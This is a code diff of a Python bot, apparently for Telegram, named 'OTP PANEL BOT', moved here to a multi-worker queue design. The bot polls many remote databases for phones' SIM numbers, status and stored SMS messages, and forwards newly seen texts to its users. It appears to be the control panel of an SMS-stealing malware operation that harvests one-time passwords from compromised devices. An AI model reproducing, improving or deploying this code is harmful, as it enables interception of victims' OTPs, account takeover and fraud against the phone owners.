+                devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
+
+        GLOBAL_DEVICE_CACHE[tag] = devices_list
+
+        if not is_first_run:
+            online_devs = [d for d in devices_list if d.status == "online"]
+            if not online_devs: return
+            
+            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
+            device_map = {d.id: d for d in online_devs}
+            
+            for bulk_data in (r_main, r_user, r_root):
+                if not isinstance(bulk_data, dict): continue
+                for dev_id, sms_dict in bulk_data.items():
+                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
+                    for k, sms in sms_dict.items():
+                        if not isinstance(sms, dict): continue
+                        sk = seen_key(dev_id, k)
+                        if sk in seen_ids: continue
+                        seen_ids.add(sk)
+                        try: await _forward_sms(device_map.get(dev_id), sms)
+                        except: pass
+                                
+    except: pass
 
 async def _forward_sms(device: Device, sms: dict) -> None:
     body = sms.get("body") or sms.get("message") or sms.get("text") or ""
@@ -1610,131 +1737,34 @@ async def _forward_sms(device: Device, sms: dict) -> None:
             
     if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)
 
-async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
-    async with SCAN_SEMAPHORE:
+async def db_worker():
+    while True:
+        tag, url, is_first_run = await db_queue.get()
         try:
-            sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
-                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
-                fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
-            )
-
-            devices_list, added_set = [], set()
-
-            if isinstance(sim_all, dict):
-                info_all = device_info_all if isinstance(device_info_all, dict) else {}
-                for dev_id, sim in sim_all.items():
-                    if dev_id in added_set or not isinstance(sim, dict): continue
-                    added_set.add(dev_id)
-                    info = info_all.get(dev_id) or {}
-                    nums = extract_all_nums(sim, info)
-                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
-                    ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
-                    
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
-
-            if isinstance(user_data_all, dict):
-                for dev_id, data in user_data_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    ts = data.get("timestamp")
-                    
-                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))
-
-            if isinstance(clients_all, dict):
-                for dev_id, client in clients_all.items():
-                    if dev_id in added_set or not isinstance(client, dict): continue
-                    sim_list = client.get("sims", [])
-                    nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
-                    if not nums and not client.get("modelName"): continue
-                    added_set.add(dev_id)
-                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
-                    status = "online" if client.get("status") is True else "offline"
-                    
-                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
-                    
-            if isinstance(devices_all, dict):
-                for dev_id, data in devices_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
-                    ts = data.get("timestamp")
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))
-
-            if isinstance(users_all, dict):
-                for dev_id, data in users_all.items():
-                    if dev_id in added_set or not isinstance(data, dict): continue
-                    added_set.add(dev_id)
-                    nums = extract_all_nums(data)
-                    model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
-                    ts = data.get("timestamp")
-                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))
-
-        except: pass
-        return tag, devices_list
-
-async def fetch_all_databases() -> Dict[str, List[Device]]:
-    tasks = [fetch_single_db(tag, url) for tag, url in DATABASES.items()]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    return {tag: devices for result in results if isinstance(result, tuple) for tag, devices in [result]}
-
-async def poll_single_db(tag: str, url: str, is_first_run: bool = False) -> int:
-    async with SCAN_SEMAPHORE:
-        try:
-            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
-            device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
-            
-            for bulk_data in (r_main, r_user, r_root):
-                if not isinstance(bulk_data, dict): continue
-                for dev_id, sms_dict in bulk_data.items():
-                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
-                    for k, sms in sms_dict.items():
-                        if not isinstance(sms, dict): continue
-                        sk = seen_key(dev_id, k)
-                        if sk in seen_ids: continue
-                        seen_ids.add(sk)
-                        if not is_first_run:
-                            try: await _forward_sms(device_map.get(dev_id), sms)
-                            except: pass
-                                
-            type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
-            if type4_devs:
-                async def fetch_t4_sms(d: Device):
-                    sms_dict = await fb_get(d.sms_path, d.base_url)
-                    if isinstance(sms_dict, dict):
-                        for k, sms in sms_dict.items():
-                            if not isinstance(sms, dict): continue
-                            sk = seen_key(d.id, k)
-                            if sk in seen_ids: continue
-                            seen_ids.add(sk)
-                            if not is_first_run:
-                                try: await _forward_sms(d, sms)
-                                except: pass
-                await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs))
-            return 1
-        except: return 0
+            await fetch_and_process_db(tag, url, is_first_run)
+        except Exception: pass
+        finally:
+            db_queue.task_done()
 
 async def poll_loop(app: Application) -> None:
     global first_run, _main_app
     _main_app = app
     
+    for _ in range(NUM_WORKERS):
+        asyncio.create_task(db_worker())
+    
     while True:
-        try:
-            for tag, devices in (await fetch_all_databases()).items():
-                if devices: GLOBAL_DEVICE_CACHE[tag] = devices
-                await asyncio.sleep(0.01)
+        for tag, url in DATABASES.items():
+            await db_queue.put((tag, url, first_run))
+        
+        await db_queue.join()
+        
+        if first_run:
+            first_run = False
+            total_devices = sum(len(devs) for devs in GLOBAL_DEVICE_CACHE.values())
+            online_devices = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == 'online')
+            tlog(f"✅ Bot Ready! {len(DATABASES)} DBs, {total_devices} devices, {online_devices} online")
             
-            tasks = [poll_single_db(tag, url, is_first_run=first_run) for tag, url in DATABASES.items() if GLOBAL_DEVICE_CACHE.get(tag)]
-            if tasks: await asyncio.gather(*tasks, return_exceptions=True)
-            
-            if first_run:
-                first_run = False
-                total_devices = sum(len(devs) for devs in GLOBAL_DEVICE_CACHE.values())
-                online_devices = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == 'online')
-                tlog(f"✅ Bot Ready! {len(DATABASES)} DBs, {total_devices} devices, {online_devices} online")
-            
-        except Exception: pass
         await asyncio.sleep(POLL_INTERVAL)
 
 # ══════════════════════════════════════════════════════════════════
@@ -1744,7 +1774,7 @@ async def poll_loop(app: Application) -> None:
 def main() -> None:
     print("═" * 60)
     print("  🤖 OTP PANEL BOT — VIP EDITION (1000+ USERS)")
-    print("  🚀 Fresh SMS Filter | Owner Transfer | Railway Ready")
+    print("  🚀 50x Workers | Strict Freshness Filter | Railway Ready")
     print(f"  📱 {len(DATABASES)} Databases Loaded Successfully")
     print("═" * 60)
 
@@ -1758,6 +1788,7 @@ def main() -> None:
     app.add_error_handler(global_error_handler)
 
     async def post_init(application: Application) -> None:
+        asyncio.create_task(dummy_web_server())
         load_data()
         for clone_token, c_data in list(CLONES.items()):
             if time.time() < c_data.get("expiry", 0):
@@ -1767,7 +1798,6 @@ def main() -> None:
         asyncio.create_task(poll_loop(application))
         asyncio.create_task(auto_save_loop())
         asyncio.create_task(auto_backup_loop(application))
-        asyncio.create_task(dummy_web_server())
 
     app.post_init = post_init
     
